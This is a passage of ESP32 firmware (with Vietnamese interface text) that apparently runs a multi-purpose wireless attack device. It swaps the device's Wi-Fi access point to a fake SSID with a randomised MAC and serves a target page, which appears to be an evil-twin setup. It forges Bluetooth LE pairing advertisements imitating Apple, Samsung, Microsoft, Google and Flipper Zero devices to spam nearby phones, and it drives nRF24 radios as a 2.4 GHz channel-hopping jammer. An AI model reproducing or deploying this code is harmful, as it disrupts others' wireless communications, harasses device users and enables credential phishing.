		request->send(HTTP_POST, "text/html", html);
	});
	server.on(("/stop_" + AP_SSID).c_str(), HTTP_GET, handleStop);
	if (loadFromConfig("status") == "0") {
		server.onNotFound([](AsyncWebServerRequest *request) {handleIndex(request); });
	}
	if (loadFromConfig("status") == "1") {
		server.onNotFound([](AsyncWebServerRequest *request) {htmltarget(request); });
	}
	server.on("/start", HTTP_POST, [](AsyncWebServerRequest *request) {
		if (WiFi.softAPSSID() != AP_SSID) {
			htmltarget(request);
			return;
		}
		saveToConfig("status", "1");
		saveToConfig("check", request->hasParam("checkControl8720", true) ? "1" : "0");
		Fake_SSID = loadFromConfig("fakessid");
		if (Fake_SSID.isEmpty()) Fake_SSID = AP_SSID;
		String response = header(MAIN_TITLE) + "WiFi đã thay đổi SSID thành: <br><h1>" + Fake_SSID + "</h1></div></body></html>";
		request->send(200, "text/html", response);
		request->onDisconnect([]() {
			String macAddress = loadFromConfig("mac");
			if (!macAddress.isEmpty()) {
				if (macAddress.length() == 17) {
					uint8_t mac[6];
					sscanf(macAddress.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
					mac[5] = random(0x00, 0xFF);
					char newMacStr[18];
					sprintf(newMacStr, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
					esp_wifi_set_mac(WIFI_IF_AP, mac);
				}
			}
			String channelStr = loadFromConfig("channel"); 
			int channel = channelStr.toInt();
			if (channel <= 0 || channel > 13) {
				channel = random(1, 14);
			}
			WiFi.softAP(Fake_SSID.c_str(), NULL, channel);
			server.onNotFound([](AsyncWebServerRequest *request) { htmltarget(request); });
			server.begin();
		});
	});
	server.begin();
	digitalWrite(BUILTIN_LED, LOW);
	listenTimereset = millis();
}

void generateRandomName(char* buffer, size_t len) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (size_t i = 0; i < len - 1; i++) {
        buffer[i] = charset[random(strlen(charset))];
    }
    buffer[len - 1] = '\0';
}

BLEAdvertisementData getAdvertisementData(CompanyType type, uint8_t& selected_model_index, String& device_name) {
    BLEAdvertisementData AdvData = BLEAdvertisementData();
    uint8_t* AdvData_Raw = nullptr;
    uint8_t i = 0;
    selected_model_index = 0;
    device_name = "";

    switch (type) {
        case Microsoft: {
            char name[16];
            generateRandomName(name, sizeof(name));
            device_name = String(name);
            uint8_t name_len = strlen(name);
            AdvData_Raw = new uint8_t[7 + name_len];
            AdvData_Raw[i++] = 7 + name_len - 1;
            AdvData_Raw[i++] = 0xFF;
            AdvData_Raw[i++] = 0x06;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x03;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x80;
            memcpy(&AdvData_Raw[i], name, name_len);
            i += name_len;
            AdvData.addData(String((char *)AdvData_Raw, 7 + name_len));
            break;
        }
        case Apple: {
            int device_choice = random(2);
            if (device_choice == 0) {
                selected_model_index = random(17);
                device_name = APPLE_DEVICE_NAMES[selected_model_index];
                AdvData.addData(String((char*)DEVICES[selected_model_index], 31));
            } else {
                selected_model_index = random(13) + 17;
                device_name = APPLE_DEVICE_NAMES[selected_model_index];
                AdvData.addData(String((char*)SHORT_DEVICES[selected_model_index - 17], 23));
            }
            break;
        }
        case Samsung: {
            selected_model_index = random(26);
            device_name = WATCH_MODELS[selected_model_index].name;
            AdvData_Raw = new uint8_t[15];
            uint8_t model = WATCH_MODELS[selected_model_index].value;
            AdvData_Raw[i++] = 14;
            AdvData_Raw[i++] = 0xFF;
            AdvData_Raw[i++] = 0x75;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x01;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x02;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x01;
            AdvData_Raw[i++] = 0x01;
            AdvData_Raw[i++] = 0xFF;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x43;
            AdvData_Raw[i++] = (model >> 0x00) & 0xFF;
            AdvData.addData(String((char *)AdvData_Raw, 15));
            break;
        }
        case Google: {
            device_name = "GoogleDevice";
            AdvData_Raw = new uint8_t[14];
            AdvData_Raw[i++] = 3;
            AdvData_Raw[i++] = 0x03;
            AdvData_Raw[i++] = 0x2C;
            AdvData_Raw[i++] = 0xFE;
            AdvData_Raw[i++] = 6;
            AdvData_Raw[i++] = 0x16;
            AdvData_Raw[i++] = 0x2C;
            AdvData_Raw[i++] = 0xFE;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0xB7;
            AdvData_Raw[i++] = 0x27;
            AdvData_Raw[i++] = 2;
            AdvData_Raw[i++] = 0x0A;
            AdvData_Raw[i++] = (random(120)) - 100;
            AdvData.addData(String((char *)AdvData_Raw, 14));
            break;
        }
        case FlipperZero: {
            char name[6];
            generateRandomName(name, sizeof(name));
            device_name = String(name);
            uint8_t name_len = strlen(name);
            AdvData_Raw = new uint8_t[31];
            AdvData_Raw[i++] = 0x02;
            AdvData_Raw[i++] = 0x01;
            AdvData_Raw[i++] = 0x06;
            AdvData_Raw[i++] = 0x06;
            AdvData_Raw[i++] = 0x09;
            memcpy(&AdvData_Raw[i], name, name_len);
            i += name_len;
            AdvData_Raw[i++] = 0x03;
            AdvData_Raw[i++] = 0x02;
            AdvData_Raw[i++] = 0x80 + (random(3)) + 1;
            AdvData_Raw[i++] = 0x30;
            AdvData_Raw[i++] = 0x02;
            AdvData_Raw[i++] = 0x0A;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x05;
            AdvData_Raw[i++] = 0xFF;
            AdvData_Raw[i++] = 0xBA;
            AdvData_Raw[i++] = 0x0F;
            AdvData_Raw[i++] = 0x4C;
            AdvData_Raw[i++] = 0x75;
            AdvData_Raw[i++] = 0x67;
            AdvData_Raw[i++] = 0x26;
            AdvData_Raw[i++] = 0xE1;
            AdvData_Raw[i++] = 0x80;
            AdvData.addData(String((char *)AdvData_Raw, i));
            break;
        }
        default: {
            Serial.println("Unknown Company Type");
            break;
        }
    }

    delete[] AdvData_Raw;
    return AdvData;
}

void changeMACAdress() {
    esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    for (int i = 0; i < 6; i++) {
        dummy_addr[i] = random(256);
        if (i == 0) {
            dummy_addr[i] |= 0xC0;
        }
    }
    int adv_type_choice = random(3);
    if (adv_type_choice == 0) {
        pAdvertising->setAdvertisementType(ADV_TYPE_IND);
    } else if (adv_type_choice == 1) {
        pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
    } else {
        pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
    }
	Serial.printf("Dummy MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
		dummy_addr[0], dummy_addr[1], dummy_addr[2],
		dummy_addr[3], dummy_addr[4], dummy_addr[5]);
    pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
}

void BLEspam(CompanyType type) {
    static bool bleInitialized = false;
    if (!bleInitialized) {
        BLEDevice::init("ESP32_Advert");
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
        pServer = BLEDevice::createServer();
        pAdvertising = pServer->getAdvertising();
        esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
        pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
        bleInitialized = true;
    }

    uint8_t selected_model_index;
    String device_name;
    BLEAdvertisementData advertisementData = getAdvertisementData(type, selected_model_index, device_name);

    Serial.print("Advertising as: ");
    Serial.println(device_name);

    BLEAdvertisementData scanResponseData = BLEAdvertisementData();
    scanResponseData.setName(device_name.c_str());
    pAdvertising->setScanResponseData(scanResponseData);
    changeMACAdress();
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->start();
	delay(1000);
	if (buttonPressed) {
        pAdvertising->stop();
        ESP.restart(); 
    }
    pAdvertising->stop();

    int rand_val = random(100);
    if (rand_val < 70) {
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
    } else if (rand_val < 85) {
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 1));
    } else if (rand_val < 95) {
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 2));
    } else if (rand_val < 99) {
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 3));
    } else {
        esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 4));
    }
}

void loop() {
	if (millis() - listenTimereset < 15000) {
		checkResetButton();
	}
	
	String currentSSID = WiFi.softAPSSID();
	if (currentSSID != lastSSID) {  
		updateLEDState();
		lastSSID = currentSSID;
	}
	
	if (waiting && !wifiChecked && millis() - startTime >= 20000 && loadFromConfig("check") == "1") {
		digitalWrite(START_PIN, HIGH);
		delay(100);
		digitalWrite(START_PIN, LOW);
        waiting = false;
    }
	
// Bluetooth Jammer
	if ((setofftime && millis() >= off_time) || digitalRead(OFF_BLUE_PIN) == HIGH) {
		delay(1000);
		if (radio1.isChipConnected()) {
			radio1.powerDown();
		}
		if (radio2.isChipConnected()) {  
			radio2.powerDown();
		}
		ESP.restart();
	}
	if (jammer_waiting_to_start && millis() >= start_time) {
		if (blue_mode == "HSPIVSPI") {
			initHP();
			initVP();
		} else if (blue_mode == "HSPI") {
			initHP();
		} else if (blue_mode == "VSPI") {
			initVP();
		}
		jammer_waiting_to_start = false;
		jammer_running = true;
		jammer_pause_running = false;
		if (settime) end_time = millis() + (attack_duration * 1000);
	}
	if (jammer_running) {
		startBlinking();
		while (true){
			if ((setofftime && millis() >= off_time) || digitalRead(OFF_BLUE_PIN) == HIGH) {
				jammer_running = false; 
				break;
			}
			if (settime && millis() >= end_time) {
				jammer_running = false;
				if (repeat_attack) {
					jammer_pause_running = true;
					pause_time = millis() + (setpausetime ? (pause_duration * 1000) : (attack_duration * 1000));
				} else {
					if (radio1.isChipConnected()) {
						radio1.powerDown();
					}
					if (radio2.isChipConnected()) {  
						radio2.powerDown();
					}
					ESP.restart();
				}
				if (radio1.isChipConnected()) {
					radio1.powerDown();
				}
				if (radio2.isChipConnected()) {  
					radio2.powerDown();
				}
				break;
			}
			if (radio1.isChipConnected()) {
				if (digitalRead(ON_BLUE_PIN) == HIGH) {
					if (flag == 0) {
						ch += 2;
					} else {
						ch -= 2;
					}
					if ((ch > 125) && (flag == 0)) {
						flag = 1;
					} else if ((ch < 2) && (flag == 1)) {
						flag = 0;
					}
					radio1.setChannel(ch);
				} else {
					radio1.setChannel(random(125));
				}
			}
			if (radio2.isChipConnected()) {  
				if (digitalRead(ON_BLUE_PIN) == HIGH) {
					if (flag == 0) {
						ch += 4;
					} else {
						ch -= 4;
					}
					if ((ch > 125) && (flag == 0)) {
						flag = 1;
					} else if ((ch < 2) && (flag == 1)) {
						flag = 0;
					}
					radio2.setChannel(ch);
				} else {
					radio2.setChannel(random(125));
				}
			}
			delayMicroseconds(random(60));
		}
	} else {
		updateLEDState();
	}
	if ((jammer_pause_running && repeat_attack && millis() >= pause_time) || digitalRead(ON_BLUE_PIN) == HIGH) {
		startJammer(blue_mode, attack_duration, repeat_attack, settime, 0, pause_duration, 0);
	}
	
//BLE Spammer	
	if (buttonPressed) {
        spammer_running = false;
        pAdvertising->stop(); 
        updateLEDState(); 
        Serial.println("Spammer stopped by button");
        buttonPressed = false; 
    }
    if (spammer_running && !selectedTypes.empty()) {
        startBlinking(); 
        BLEspam(selectedTypes[currentTypeIndex]);
        if (spammer_running) { 
            currentTypeIndex = (currentTypeIndex + 1) % selectedTypes.size();
        }
    } else {
        spammer_running = false;
        updateLEDState(); 
    }
}